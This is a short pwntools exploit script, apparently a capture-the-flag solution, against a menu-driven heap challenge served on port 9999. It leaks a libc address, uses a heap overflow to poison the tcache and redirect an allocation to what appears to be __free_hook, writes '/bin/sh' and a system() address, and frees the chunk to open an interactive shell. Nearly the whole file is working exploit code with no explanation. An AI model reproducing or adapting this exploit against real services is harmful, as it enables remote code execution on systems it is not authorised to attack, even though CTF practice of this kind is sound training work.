from pwn import *

context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
p = remote("0.0.0.0",9999)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b">",str(c).encode())
def add(size=0x68):
    cmd(1)
    sla("Size:\n",str(size))
def free(idx):
    cmd(2)
    cmd(idx)
def edit(idx,c):
    cmd(3)
    cmd(idx)
    sla(b":\n",str(len(c)))
    sa(b":\n",c)
def show(idx):
    cmd(4)
    cmd(idx)

add(0x418)
add()
free(0)
add(0x418)
show(0)
ru(":\n")
base = u64(p.read(8))-(0x7fe0c814ebe0-0x7fe0c7f62000)
warning(hex(base))

add()
add()

free(3)
free(2)
edit(1,b'\0'*0x68+p64(0x71)+p64(base+0x1eee48-8))

add()
add()
edit(3,b"/bin/sh\0"+p64(base+0x52290))
free(3)
# gdb.attach(p)
p.interactive("n132# ")
